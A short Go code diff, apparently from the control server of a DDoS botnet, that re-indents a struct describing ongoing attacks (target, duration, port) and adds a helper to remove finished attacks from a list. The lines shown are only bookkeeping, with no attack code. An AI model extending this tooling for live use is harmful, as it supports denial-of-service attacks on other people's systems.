@@ -24,10 +24,10 @@ type AccInfo struct {
 }
 
 type OngoingAttack struct {
-	Name     string
-	Target   string
-	Duration time.Duration
-	Port     string
+    Name     string
+    Target   string
+    Duration time.Duration
+    Port     string
 }
 
 var (
@@ -82,4 +82,13 @@ func DecrementBotCount() {
 	BotCountLock.Lock()
 	defer BotCountLock.Unlock()
 	BotCount--
+}
+
+func RemoveOngoingAttack(attack OngoingAttack) {
+    for i, a := range OngoingAttacks {
+        if a == attack {
+            OngoingAttacks = append(OngoingAttacks[:i], OngoingAttacks[i+1:]...)
+            break
+        }
+    }
 }
